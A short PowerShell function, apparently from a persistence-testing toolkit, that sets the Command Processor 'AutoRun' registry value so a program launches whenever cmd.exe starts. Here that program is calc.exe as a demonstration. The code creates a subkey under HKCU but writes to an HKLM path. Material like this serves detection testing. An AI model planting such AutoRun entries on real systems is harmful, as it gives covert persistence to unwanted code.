# CMD AutoRun 
#----------------------------------------------------------------------------------------------------------------------------------#
function CMD_AutoRun_Persist {
Write-host -ForegroundColor Yellow "Set CMD AutoRun..."
Start-Sleep 2
$key = "HKLM:"
$ServiceKey = "SOFTWARE\Microsoft\Command Processor"
[void] [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey($ServiceKey)
New-ItemProperty -Path $key$($ServiceKey) -Name "AutoRun" -Value "calc.exe" -PropertyType "String" -Force | Out-Null
Write-host -ForegroundColor Green "Done!"
}
